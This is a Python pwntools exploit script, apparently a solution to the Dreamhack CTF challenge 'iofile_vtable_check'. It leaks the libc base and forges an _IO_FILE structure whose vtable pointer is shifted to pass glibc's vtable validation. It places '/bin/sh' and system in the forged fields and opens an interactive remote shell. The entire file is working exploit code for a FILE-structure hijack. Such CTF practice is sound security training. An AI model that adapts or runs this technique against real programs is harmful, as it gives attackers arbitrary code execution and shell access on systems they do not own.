from pwn import *
#p = process('iofile_vtable_check')
p = remote('host1.dreamhack.games', 20429)
elf = ELF('iofile_vtable_check')
libc = ELF('libc.so.6')
#libc = ELF('/work/libc-ld.so/libc-2.27/64bit/libc.so.6')

addr_libcBase = int(p.recvline().replace('\n', '').split(': ')[1], 16) - libc.symbols['_IO_2_1_stdout_']
addr_vtable = addr_libcBase + libc.symbols['_IO_file_jumps']
addr_fp = elf.symbols['fp']
addr_system = addr_libcBase + libc.symbols['system']
log.info('system: ' +  hex(addr_system))
log.info('libc base: ' + hex(addr_libcBase))
log.info('vtable: ' + hex(addr_vtable))
p.recvrepeat(0.5)


addr_sh = addr_libcBase + next(libc.search('/bin/sh'))
IF = p64(0x2000) #flags
IF += p64(0) #read_ptr
IF += p64(0) #read_base
IF += p64(0) #write_base
IF += p64(0) #write_ptr
IF += p64(0) #write_end 
IF += p64(0) #buf_base
IF += p64(addr_sh) #buf_end
IF += p64(0) #save_base
IF += p64(0)*((0x88 - len(IF))/8)
IF += p64(addr_fp+0x200) #lock 
IF += p64(0)*9
'''
IF += p64(0)*((0xd8 - len(IF))/8)
'''
vtable = p64(addr_vtable + 0x50 - 8) #doallocate

IF_plus = IF + vtable
IO_strFile = IF_plus + p64(0) + p64(addr_system) #_s.free_buffer

p.sendline(IO_strFile)
p.interactive()
